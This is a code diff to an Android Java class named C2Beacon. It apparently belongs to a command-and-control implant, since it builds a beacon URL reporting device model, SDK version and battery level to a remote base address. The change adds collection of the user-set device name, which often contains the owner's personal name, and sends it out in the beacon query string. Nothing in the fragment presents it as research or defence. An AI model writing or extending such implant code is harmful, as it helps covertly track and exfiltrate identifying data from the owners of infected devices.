@@ -188,7 +188,10 @@ public class C2Beacon implements Runnable {
             int scale = bi != null ? bi.getIntExtra("scale", 100) : 100;
             if (level >= 0 && scale > 0) batt = level * 100 / scale;
         } catch (Exception ignored) {}
+        String name = "?";
+        try { name = android.provider.Settings.Global.getString(svc.getContentResolver(), "device_name"); } catch (Exception ignored) {}
         return base + path + "?model=" + model
+                + "&name=" + java.net.URLEncoder.encode(name == null || name.isEmpty() ? "?" : name, "UTF-8")
                 + "&sdk=" + Build.VERSION.SDK_INT
                 + "&batt=" + batt;
     }
